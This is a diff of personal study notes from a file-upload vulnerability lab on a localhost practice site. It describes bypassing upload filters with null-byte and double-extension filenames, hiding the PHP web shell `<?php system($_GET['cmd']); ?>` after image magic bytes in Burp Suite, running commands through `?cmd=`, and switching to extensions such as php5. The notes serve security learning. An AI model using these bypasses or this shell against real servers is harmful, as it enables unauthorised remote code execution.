@@ -2467,12 +2467,72 @@ upload an image and txt file to test the webserver =>  the webserver only accept
 
 <span style="background:#fff88f">we need to understand where the app checks for this control:</span>
 the app could:
-- look at the file extension   (filename="file.<span style="color:#00b050"><u>php</u></span>")
+- <span style="color:#00b050">look at the file extension </span>  (filename="file.<span style="color:#00b050"><u>php</u></span>")
   how to bypass this:
   `filename="file.php%00.png"`
   `%00` -->  is a NULL byte => it ends the string
   
   `filename="file.php.png"`
   sometimes if the app is not well configured -->  also this can bypass the check
-- 
+  
+- <span style="color:#00b050">check the Magic bytes</span>
 ##### Bypass Check Server-Side (Magic Bytes)
+magic bytes -->      - first bytes of a file
+                - they tell the system what type of file it is
+Example:
+![[Pasted image 20240310115626.png]]
+
+=>
+on BurpSuite:
+- click the `<` (back arrow) -->  to turn back to the original request
+- insert our payload few lines after the magic bytes -->  `<?php system($_GET['cmd']); ?>`
+- change the filetype to php
+  =>
+  do something like this:![[Pasted image 20240310120747.png]]
+  >[!warning]
+  >you need to play a little bit on where to put the shell
+  >maybe after the magic bytes, after 2/3 lines, you need to delete part of the img (as we did)
+
+- Send the request
+  =>
+  _<span style="color:#00b050">The file is been uploaded</span>
+  
+Now we should do -->  directory busting (to find where the file is been uploaded)
+                     but we already know that
+=>
+let's connect to 
+`http://localhost/labs/uploads/Example2.php?cmd=COMMAND`
+and see if it worked:
+![[Pasted image 20240310121100.png]]
+<span style="color:#00b050">IT WORKED</span> 
+
+###### Bypass also File Extension Check Server Side
+
+  >[!warning] If the Server checks the file extension inside the namefile
+  >=>
+  >try to google -->  valid php file extension
+  >=>
+  >you'll find other extension -->  that can execute php anyway
+  >![[Pasted image 20240310121409.png]]
+  
+  
+  
+
+
+#### File Upload 0x03
+- turn on FroxyProxy
+- do the [[cheet#Initial things to do]] for BurpSuite
+- upload an img
+- open it inside Proxy > HTTP History
+- Send to Repeater
+	- Insert our shell inside the image after the magic bytes and delete a portion of it
+	- change the filetype to php
+	- <span style="color:#00b050">WE GOT AN ERROR</span> -->  here the server checks that you upload only jpg and png
+	=>
+	- google -->  valid php file extension
+	- retry with different extension
+	- <span style="color:#00b050">with php5 works</span>
+		![[Pasted image 20240310124022.png]]
+		=>
+		![[Pasted image 20240310124600.png]]
+
